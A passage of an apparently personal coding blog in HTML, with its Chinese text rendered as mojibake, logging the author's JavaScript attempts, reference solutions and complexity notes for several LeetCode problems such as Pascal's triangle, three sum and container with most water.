nums[j]</span><br><span class="line">        <span class="keyword">while</span> (sum &gt;= s) &#123;</span><br><span class="line">            ans = <span class="built_in">Math</span>.min(ans, j - i + <span class="number">1</span>)</span><br><span class="line">            sum -= nums[i++]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans === int_max ? <span class="number">0</span> : ans</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ç®—æ³•å¤æ‚åº¦"><a href="#ç®—æ³•å¤æ‚åº¦" class="headerlink" title="ç®—æ³•å¤æ‚åº¦"></a>ç®—æ³•å¤æ‚åº¦</h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(n),æ¯ä¸ªæŒ‡é’ˆç§»åŠ¨éƒ½éœ€è¦O(n) çš„æ—¶é—´,æ¯ä¸ªå…ƒç´ æœ€å¤šè¢«è®¿é—®2æ¬¡</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(1)</li></ul><h2 id="LeetCode118â€”â€”æ¨è¾‰ä¸‰è§’ï¼ˆâ˜†ï¼‰"><a href="#LeetCode118â€”â€”æ¨è¾‰ä¸‰è§’ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode118â€”â€”æ¨è¾‰ä¸‰è§’ï¼ˆâ˜†ï¼‰"></a>LeetCode118â€”â€”æ¨è¾‰ä¸‰è§’ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/pascals-triangle/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -8"><a href="#è‡ªå·±çš„ä»£ç -8" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> generate = <span class="function"><span class="keyword">function</span> (<span class="params">numRows</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(numRows)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">    arr[i]=<span class="keyword">new</span> <span class="built_in">Array</span>(i+<span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numRows; i++)&#123;</span><br><span class="line">    arr[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; i; j++)&#123;</span><br><span class="line">      arr[i][j] = arr[i - <span class="number">1</span>][j - <span class="number">1</span>] + arr[i - <span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    arr[i][i] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶å®ä¸éš¾ï¼Œæ¯•ç«Ÿeasyé¢˜ã€‚ä½†æ˜¯çœ‹äº†ç­”æ¡ˆåå‘ç°è‡ªå·±å¤šäº†å¾ˆå¤šå†—ä½™ä»£ç ï¼Œæ¯”å¦‚åˆ›å»ºäºŒç»´æ•°ç»„ï¼Œå®Œå…¨å¯ä»¥å…ˆ var arr=[]ï¼Œç„¶åæœ€åå†pushçš„æ–¹å¼åˆ›å»ºï¼›è¿˜æœ‰å°±æ˜¯ä¸å¿…ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªèµ‹å€¼1ï¼Œå¯ä»¥ç”¨fill(1)çš„æ–¹å¼ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-4"><a href="#æ€è·¯-amp-é¢˜è§£-4" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> generate = <span class="function"><span class="keyword">function</span>(<span class="params">numRows</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ret = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> row = <span class="keyword">new</span> <span class="built_in">Array</span>(i + <span class="number">1</span>).fill(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; row.length - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            row[j] = ret[i - <span class="number">1</span>][j - <span class="number">1</span>] + ret[i - <span class="number">1</span>][j];</span><br><span class="line">        &#125;</span><br><span class="line">        ret.push(row);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-5"><a href="#å¤æ‚åº¦åˆ†æ-5" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a><strong>å¤æ‚åº¦åˆ†æ</strong></h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO*(*numRows^2)ã€‚</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚ä¸è€ƒè™‘è¿”å›å€¼çš„ç©ºé—´å ç”¨ã€‚</li></ul><h2 id="LeetCode557â€”â€”åè½¬å­—ç¬¦ä¸²ï¼ˆâ˜†ï¼‰"><a href="#LeetCode557â€”â€”åè½¬å­—ç¬¦ä¸²ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode557â€”â€”åè½¬å­—ç¬¦ä¸²ï¼ˆâ˜†ï¼‰"></a>LeetCode557â€”â€”åè½¬å­—ç¬¦ä¸²ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -9"><a href="#è‡ªå·±çš„ä»£ç -9" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = []</span><br><span class="line">  <span class="keyword">var</span> s1=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (s[i] !== <span class="string">&quot; &quot;</span>) &#123;</span><br><span class="line">      arr.push(s[i])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      s1=s1+arr.reverse().join(<span class="string">&quot;&quot;</span>)+<span class="string">&quot; &quot;</span>;</span><br><span class="line">      arr=[]</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  s1=s1+arr.reverse().join(<span class="string">&quot;&quot;</span>)+<span class="string">&quot; &quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> s1;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç£¨ç£¨è¹­è¹­å†™äº†åŠå¤©æ‰åšå¯¹ï¼Œè¿˜æ˜¯apiæ²¡ç”¨ç²¾å•Šã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-5"><a href="#æ€è·¯-amp-é¢˜è§£-5" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><ul><li><code>split</code>å­—ç¬¦ä¸² è½¬ å•è¯æ•°ç»„</li><li><code>map</code>ä¿®æ”¹æ¯ä¸ªå•è¯ = å•è¯ è½¬ æ•°ç»„ <code>reverse</code> è½¬ å•è¯</li><li><code>join</code>å•è¯æ•°ç»„ è½¬ å­—ç¬¦ä¸²</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">&#x27; &#x27;</span>).map(<span class="function"><span class="params">x</span> =&gt;</span> x.split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>)).join(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä»¥åæ¯åšä¸€é“é¢˜å¾—å…ˆæƒ³æ¸…æ¥šæ€è·¯äº†ï¼Œè¿™é“é¢˜å¦‚æœæƒ³æ¸…æ¥šï¼Œå…ˆåˆ†å‰²æˆå•è¯ï¼Œå†æŠŠæ¯ä¸ªå•è¯åˆ†å‰²æˆå­—æ¯ï¼Œå†åè½¬ï¼Œå†è¿æ¥ï¼Œå¾ˆå¿«å°±è¡Œäº†ã€‚</p><h2 id="LeetCode283â€”â€”ç§»åŠ¨é›¶ï¼ˆâ˜†ï¼‰"><a href="#LeetCode283â€”â€”ç§»åŠ¨é›¶ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode283â€”â€”ç§»åŠ¨é›¶ï¼ˆâ˜†ï¼‰"></a>LeetCode283â€”â€”ç§»åŠ¨é›¶ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/move-zeroes/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -10"><a href="#è‡ªå·±çš„ä»£ç -10" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> moveZeroes = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = nums.length; i--;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[i] === <span class="number">0</span>) &#123;</span><br><span class="line">      nums.splice(i, <span class="number">1</span>);</span><br><span class="line">      nums.push(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nums;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸éš¾ï¼Œä¸»è¦æ˜¯ä¼˜åŒ–ï¼šæ¯æ¬¡æ‰§è¡Œ splice ç›¸å½“äºæŠŠ i åçš„æ•°éƒ½å‘å‰ç§»ä¸€ä½ï¼Œæ—¶é—´å¤æ‚åº¦O(n)ï¼Œ for å¾ªç¯ä¹Ÿæ˜¯O(n)ï¼Œæ‰€ä»¥ä»£ç æ—¶é—´å¤æ‚åº¦ä¸ºO(n^2)ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-6"><a href="#æ€è·¯-amp-é¢˜è§£-6" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>åŒæŒ‡é’ˆï¼š</p><ol><li>å·¦æŒ‡é’ˆå·¦è¾¹å‡ä¸ºéé›¶æ•°ï¼›</li><li>å³æŒ‡é’ˆå·¦è¾¹ç›´åˆ°å·¦æŒ‡é’ˆå¤„å‡ä¸ºé›¶ã€‚</li><li>å› æ­¤æ¯æ¬¡äº¤æ¢ï¼Œéƒ½æ˜¯å°†å·¦æŒ‡é’ˆçš„é›¶ä¸å³æŒ‡é’ˆçš„éé›¶æ•°äº¤æ¢ï¼Œä¸”éé›¶æ•°çš„ç›¸å¯¹é¡ºåºå¹¶æœªæ”¹å˜</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> moveZeroes = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> length = nums.length;</span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> right = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (right &lt; length) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nums[right]) &#123;</span><br><span class="line">          [nums[left],nums[right]]=[nums[right],nums[left]]</span><br><span class="line">          left++;</span><br><span class="line">      &#125;</span><br><span class="line">      right++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nums;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// å¦ä¸€ç§è§£æ³•</span></span><br><span class="line"><span class="keyword">var</span> moveZeroes = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] !== <span class="number">0</span>)&#123;</span><br><span class="line">            nums[pos++] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = pos; i &lt; nums.length; i++) &#123;</span><br><span class="line">        nums[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤æ‚åº¦åˆ†æ</p><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(n)ï¼Œå…¶ä¸­ n ä¸ºåºåˆ—é•¿åº¦ã€‚æ¯ä¸ªä½ç½®è‡³å¤šè¢«éå†ä¸¤æ¬¡ã€‚</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚åªéœ€è¦å¸¸æ•°çš„ç©ºé—´å­˜æ”¾è‹¥å¹²å˜é‡</li></ul><h2 id="LeetCode70â€”â€”çˆ¬æ¥¼æ¢¯ï¼ˆâ˜†ï¼‰"><a href="#LeetCode70â€”â€”çˆ¬æ¥¼æ¢¯ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode70â€”â€”çˆ¬æ¥¼æ¢¯ï¼ˆâ˜†ï¼‰"></a>LeetCode70â€”â€”çˆ¬æ¥¼æ¢¯ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/climbing-stairs/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -11"><a href="#è‡ªå·±çš„ä»£ç -11" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>å®Œå…¨ä¸ä¼šï¼Œæ²¡æœ‰ä¸€ç‚¹æ€è·¯ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-7"><a href="#æ€è·¯-amp-é¢˜è§£-7" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>åŠ¨æ€è§„åˆ’ï¼šï¼ˆï¼Ÿï¼ï¼‰åˆ†æˆå¤šä¸ªå­é—®é¢˜<strong>ï¼ˆæ‰¾æœ€è¿‘é‡å¤å­é—®é¢˜ï¼‰</strong>ï¼Œçˆ¬ç¬¬ n é˜¶æ¥¼æ¢¯çš„æ–¹æ³•æ•°é‡ï¼Œç­‰äº 2 éƒ¨åˆ†ä¹‹å’Œï¼š</p><ul><li>çˆ¬ä¸Š n-1 é˜¶æ¥¼æ¢¯çš„æ–¹æ³•æ•°é‡ã€‚å› ä¸ºå†çˆ¬ 1 é˜¶å°±èƒ½åˆ°ç¬¬ n é˜¶</li><li>çˆ¬ä¸Š n-2 é˜¶æ¥¼æ¢¯çš„æ–¹æ³•æ•°é‡ã€‚å› ä¸ºå†çˆ¬ 2 é˜¶å°±èƒ½åˆ°ç¬¬ n é˜¶</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> climbStairs = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> dp = [];</span><br><span class="line">  dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// å‹ç¼©ç©ºé—´ï¼šdp[i] åªä¸è¿‡å»çš„ä¸¤é¡¹ï¼šdp[i-1] å’Œ dp[i-2] æœ‰å…³ï¼Œæ²¡æœ‰å¿…è¦å­˜ä¸‹æ‰€æœ‰è®¡ç®—è¿‡çš„ dp é¡¹ã€‚æ‰€ä»¥ç”¨ä¸¤ä¸ªå˜é‡å»å­˜è¿™ä¸¤ä¸ªè¿‡å»çš„çŠ¶æ€å°±å¥½ã€‚</span></span><br><span class="line"><span class="keyword">var</span> climbStairs = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> f1 = <span class="number">0</span>, f2 = <span class="number">1</span>, f3;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; n + <span class="number">1</span> ; i++) &#123;</span><br><span class="line">    f3 = f1 + f2;</span><br><span class="line">    f1 = f2;</span><br><span class="line">    f2 = f3; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> f3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-6"><a href="#å¤æ‚åº¦åˆ†æ-6" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><p>æ—¶é—´å¤æ‚åº¦ï¼šOï¼ˆnï¼‰</p><h2 id="LeetCode15â€”â€”ä¸‰æ•°ä¹‹å’Œï¼ˆâ˜†â˜†-é«˜é¢‘è€é¢˜ï¼‰"><a href="#LeetCode15â€”â€”ä¸‰æ•°ä¹‹å’Œï¼ˆâ˜†â˜†-é«˜é¢‘è€é¢˜ï¼‰" class="headerlink" title="LeetCode15â€”â€”ä¸‰æ•°ä¹‹å’Œï¼ˆâ˜†â˜† é«˜é¢‘è€é¢˜ï¼‰"></a>LeetCode15â€”â€”ä¸‰æ•°ä¹‹å’Œï¼ˆâ˜†â˜† é«˜é¢‘è€é¢˜ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/3sum/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -12"><a href="#è‡ªå·±çš„ä»£ç -12" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> threeSum = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> num, arr = [], res = [];</span><br><span class="line">  nums = nums.sort();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; nums.length; j++)&#123;</span><br><span class="line">      num = <span class="number">0</span> - nums[i] - nums[j];</span><br><span class="line">      <span class="keyword">if</span> (nums.indexOf(num) &gt; j) &#123;</span><br><span class="line">        arr.push(nums[i]);</span><br><span class="line">        arr.push(nums[j]);</span><br><span class="line">        arr.push(num);</span><br><span class="line">        res.push(arr);</span><br><span class="line">        arr = [];</span><br><span class="line">        i++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ²¡è¿‡ï¼Œif() ä¸­çš„é€»è¾‘æœ‰ç‚¹æ‡µäº†ï¼Œä¸çŸ¥é“å¦‚ä½•å»é‡ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-3"><a href="#æ€è·¯1-amp-é¢˜è§£-3" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>ä¸‰é‡å¾ªç¯ï¼ˆè¿™ç«Ÿç„¶æ²¡æƒ³åˆ°ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> threeSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length - <span class="number">2</span>; i++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; nums.length - <span class="number">1</span>; j++) &#123; </span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> k = j + <span class="number">1</span>; k &lt; nums.length; k++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (nums[i] + nums[j] + nums[k] === <span class="number">0</span>) &#123; </span><br><span class="line">          res.push([nums[i], nums[j], nums[k]])</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-7"><a href="#å¤æ‚åº¦åˆ†æ-7" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(n^3)ï¼Œn ä¸ºæ•°ç»„é•¿åº¦</li></ul><h3 id="æ€è·¯2-amp-é¢˜è§£-3"><a href="#æ€è·¯2-amp-é¢˜è§£-3" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>é¦–å…ˆå¯¹æ•°ç»„æ’åºï¼å¤ªé‡è¦äº†ã€‚ï¼ˆè‡ªå·±å†™çš„æ—¶å€™åˆ°æœ€åæ‰æƒ³åˆ°è¿™ä¸€ç‚¹ï¼‰</p><ul><li>æ’åºåå›ºå®šä¸€ä¸ªæ•° nums[i]ï¼Œå†ä½¿ç”¨å·¦å³æŒ‡é’ˆæŒ‡å‘ nums[i]åé¢çš„ä¸¤ç«¯ï¼Œæ•°å­—åˆ†åˆ«ä¸º nums[L] å’Œ nums[R]ï¼Œè®¡ç®—ä¸‰ä¸ªæ•°çš„å’Œ sum åˆ¤æ–­æ˜¯å¦æ»¡è¶³ä¸º 0ï¼Œæ»¡è¶³åˆ™æ·»åŠ è¿›ç»“æœé›†ã€‚</li><li>å¦‚æœ nums[i]å¤§äº 0ï¼Œåˆ™ä¸‰æ•°ä¹‹å’Œå¿…ç„¶æ— æ³•ç­‰äº 0ï¼Œç»“æŸå¾ªç¯ã€‚</li><li>å¦‚æœ nums[i] = nums[iâˆ’1]ï¼Œåˆ™è¯´æ˜è¯¥æ•°å­—é‡å¤ï¼Œä¼šå¯¼è‡´ç»“æœé‡å¤ï¼Œæ‰€ä»¥åº”è¯¥è·³è¿‡ã€‚</li><li>å½“ sum = 0 æ—¶ï¼Œnums[L] = nums[L+1] åˆ™ä¼šå¯¼è‡´ç»“æœé‡å¤ï¼Œåº”è¯¥è·³è¿‡ï¼ŒL++ã€‚</li><li>å½“ sum = 0 æ—¶ï¼Œnums[R] = nums[R-1] åˆ™ä¼šå¯¼è‡´ç»“æœé‡å¤ï¼Œåº”è¯¥è·³è¿‡ï¼ŒRâˆ’âˆ’ã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> threeSum = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">const</span> length = nums.length;</span><br><span class="line">  <span class="keyword">if</span> (nums === <span class="literal">null</span> || length &lt; <span class="number">3</span>) <span class="keyword">return</span> ans;</span><br><span class="line">  nums.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[i] &gt; <span class="number">0</span>) &#123; <span class="keyword">break</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] === nums[i - <span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">let</span> L = i + <span class="number">1</span>, R = length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (L &lt; R) &#123;</span><br><span class="line">      <span class="keyword">let</span> sum = nums[i] + nums[L] + nums[R];</span><br><span class="line">      <span class="keyword">if</span> (sum === <span class="number">0</span>) &#123;</span><br><span class="line">        ans.push([nums[i], nums[L], nums[R]]);</span><br><span class="line">        <span class="keyword">while</span> (L &lt; R &amp;&amp; nums[L] === nums[L + <span class="number">1</span>]) L++;</span><br><span class="line">        <span class="keyword">while</span> (L &lt; R &amp;&amp; nums[R] === nums[R - <span class="number">1</span>]) R--;</span><br><span class="line">        L++;</span><br><span class="line">        R--;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        L++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        R--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-8"><a href="#å¤æ‚åº¦åˆ†æ-8" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)ï¼Œn ä¸ºæ•°ç»„é•¿åº¦</li></ul><h3 id="æ€è·¯3-amp-é¢˜è§£-3"><a href="#æ€è·¯3-amp-é¢˜è§£-3" class="headerlink" title="æ€è·¯3&amp;é¢˜è§£"></a>æ€è·¯3&amp;é¢˜è§£</h3><p>å“ˆå¸Œè¡¨ï¼ˆtodoï¼‰</p><h2 id="LeetCode11â€”â€”ç››æœ€å¤šæ°´çš„å®¹å™¨ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode11â€”â€”ç››æœ€å¤šæ°´çš„å®¹å™¨ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode11â€”â€”ç››æœ€å¤šæ°´çš„å®¹å™¨ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode11â€”â€”ç››æœ€å¤šæ°´çš„å®¹å™¨ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/container-with-most-water/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -13"><a href="#è‡ªå·±çš„ä»£ç -13" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxArea = <span class="function"><span class="keyword">function</span>(<span class="params">height</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> max = <span class="number">0</span>, len = height.length, sum;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i+<span class="number">1</span>; j &lt; len; j++)&#123;</span><br><span class="line">      sum = <span class="built_in">Math</span>.min(height[i], height[j]) * (j - i);</span><br><span class="line">      max = <span class="built_in">Math</span>.max(max, sum);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> max;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æš´ç ´ï¼Œä½†æ˜¯è¿‡ä¸äº†å› ä¸ºæ—¶é—´é™åˆ¶äº†ã€‚ï¼ˆçœ‹åˆ°é¢˜ç›®ååªæœ‰è¿™ä¸€ç§æƒ³æ³•äº†ï¼Œä¸çŸ¥é“å¦‚ä½•ä¼˜åŒ–æ—¶é—´å¤æ‚åº¦ï¼‰</p><h3 id="æ€è·¯-amp-é¢˜è§£-8"><a href="#æ€è·¯-amp-é¢˜è§£-8" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>åŒæŒ‡é’ˆï¼šå·¦å³è¾¹ç•Œ iï¼Œj å‘ä¸­é—´æ”¶æ•›ã€‚<strong>ï¼ˆä¸¤æ ¹æŸ±å­ï¼Œè‚¯å®šæ˜¯åŒæŒ‡é’ˆï¼‰</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxArea = <span class="function"><span class="keyword">function</span>(<span class="params">height</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> max = <span class="number">0</span>, len = height.length;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, j = len - <span class="number">1</span>; i &lt; j;)&#123;</span><br><span class="line">    <span class="comment">// æ¯ä¸ªå¾ªç¯æ‰¾åˆ°ä¸¤ä¸ªæŸ±å­ä¸­æœ€çŸ­çš„, 